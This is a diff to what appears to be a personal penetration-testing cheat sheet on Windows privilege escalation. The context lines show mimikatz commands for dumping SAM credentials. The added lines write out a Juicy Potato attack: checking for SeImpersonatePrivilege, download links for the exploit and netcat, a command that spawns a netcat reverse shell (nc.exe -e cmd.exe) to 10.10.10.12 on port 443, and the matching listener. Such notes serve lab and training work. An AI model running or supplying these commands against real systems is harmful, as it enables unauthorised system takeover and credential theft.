@@ -294,8 +294,14 @@ Pattern
                     privilege::debug
                     token::elevate
                     lsadump::sam
-                Juicy Potato
-                     https://github.com/ivanitlearning/Juicy-Potato-x86/releases/download/1.2/Juicy.Potato.x86.exe
+         4.2.4 Juicy Potato   - Golden privilege
+                whoami /all
+                check     SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
+                https://github.com/ivanitlearning/Juicy-Potato-x86/releases/download/1.2/Juicy.Potato.x86.exe
+                https://eternallybored.org/misc/netcat/
+                Place Juicy Potato and netcat on the target computer. 
+                JuicyPotato -l 1337 -p c:\windows\system32\cmd.exe -a "/c C:\wamp\www\PHP\1\fileManager\collectives\DG0\hackme\nc.exe -e cmd.exe 10.10.10.12 443" -t
+                Host: rlwrap -r nc -nlvp 
                     
                     
     4.3.Priviliege Escalation      
